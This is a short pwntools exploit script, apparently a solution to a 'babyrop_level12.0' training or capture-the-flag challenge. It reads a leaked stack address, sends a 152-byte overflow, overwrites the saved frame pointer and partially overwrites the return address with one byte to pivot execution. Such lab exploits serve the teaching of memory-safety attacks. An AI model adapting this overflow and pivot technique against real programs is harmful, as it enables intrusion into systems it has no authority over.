from pwn import *

elf = context.binary = ELF('./babyrop_level12.0')
context.log_level = 'error'

offset = 152

p = process()
p.recvuntil('at: ')

leak = p.recvline().strip(b'.\n').decode()
buffer = int(leak, 16)

payload = b'A' * offset
payload += p64(buffer - 0x10)
# payload += p16(0xfc5)
payload += p8(0xdf)

p.send(payload)

resp = b'\n'.join(p.recvlines(10)).decode()
print(resp)

try:
    resp = b'\n'.join(p.recvlines(12)).decode()
    print(resp)
    p.send('stuff')
    resp = b'\n'.join(p.recvlines(12)).decode()
    print(resp)
except:
    pass
